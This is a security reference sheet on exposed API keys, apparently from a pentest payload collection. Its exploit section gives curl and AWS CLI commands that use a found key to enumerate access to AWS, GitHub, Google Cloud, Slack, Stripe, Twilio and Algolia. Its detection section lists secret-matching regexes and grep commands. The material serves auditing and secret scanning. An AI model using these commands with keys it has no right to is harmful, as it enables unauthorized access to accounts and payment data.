# API Key Leaks

> API keys are secret tokens used to authenticate requests to APIs. When exposed in source code, configuration files, or public repositories, they can be exploited by attackers to gain unauthorized access to services.

## Summary

* [Tools](#tools)
* [Exploit](#exploit)
  * [Algolia](#algolia)
  * [AWS](#aws)
  * [GitHub](#github)
  * [Google Cloud](#google-cloud)
  * [Slack](#slack)
  * [Stripe](#stripe)
  * [Twilio](#twilio)
* [Detection](#detection)
* [References](#references)

## Tools

- [trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) - Find and verify credentials
- [gitleaks/gitleaks](https://github.com/gitleaks/gitleaks) - Detect secrets in git repos
- [awslabs/git-secrets](https://github.com/awslabs/git-secrets) - Prevents committing secrets to git
- [zricethezav/gitleaks](https://github.com/zricethezav/gitleaks) - SAST tool for detecting hardcoded secrets

## Exploit

### Algolia

```bash
curl -X GET \
  -H "X-Algolia-API-Key: <API_KEY>" \
  -H "X-Algolia-Application-Id: <APP_ID>" \
  "https://<APP_ID>-dsn.algolia.net/1/indexes/*"
```

### AWS

```bash
# Enumerate identity
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances --region us-east-1
```

### GitHub

```bash
# Check token validity and permissions
curl -H "Authorization: token <TOKEN>" https://api.github.com/user

# List repositories
curl -H "Authorization: token <TOKEN>" https://api.github.com/user/repos

# List organizations
curl -H "Authorization: token <TOKEN>" https://api.github.com/user/orgs
```

### Google Cloud

```bash
# Validate API key
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<TOKEN>"

# List GCS buckets
curl -H "Authorization: Bearer <TOKEN>" \
  "https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
```

### Slack

```bash
# Test token validity
curl -H "Authorization: Bearer <TOKEN>" \
  https://slack.com/api/auth.test

# List channels
curl -H "Authorization: Bearer <TOKEN>" \
  https://slack.com/api/conversations.list
```

### Stripe

```bash
# List charges (sk_live_ prefix = live key)
curl https://api.stripe.com/v1/charges \
  -u <API_KEY>:

# Retrieve balance
curl https://api.stripe.com/v1/balance \
  -u <API_KEY>:
```

### Twilio

```bash
# List messages
curl -X GET "https://api.twilio.com/2010-04-01/Accounts/<ACCOUNT_SID>/Messages.json" \
  -u <ACCOUNT_SID>:<AUTH_TOKEN>
```

## Detection

### Common Patterns

| Service | Pattern |
|---------|--------|
| AWS Access Key | `AKIA[0-9A-Z]{16}` |
| GitHub Token | `ghp_[a-zA-Z0-9]{36}` |
| Slack Token | `xox[baprs]-[0-9a-zA-Z]{10,48}` |
| Stripe Live Key | `sk_live_[0-9a-zA-Z]{24}` |
| Google API Key | `AIza[0-9A-Za-z\-_]{35}` |
| Twilio | `SK[0-9a-fA-F]{32}` |

### Search in Files

```bash
# Search for common API key patterns in a directory
grep -rE '(api_key|apikey|api-key|secret|token)\s*=\s*["\'][a-zA-Z0-9_\-]{20,}["\']' .

# Search git history
git log -p | grep -i 'api_key\|secret\|password\|token'
```

## References

- [KeyHacks - streaak](https://github.com/streaak/keyhacks)
- [API Key Security Best Practices - OWASP](https://owasp.org/www-community/vulnerabilities/Exposed_API_Key)
- [TruffleHog Documentation](https://github.com/trufflesecurity/trufflehog)
- [GitLeaks Rules](https://github.com/gitleaks/gitleaks/blob/master/config/gitleaks.toml)
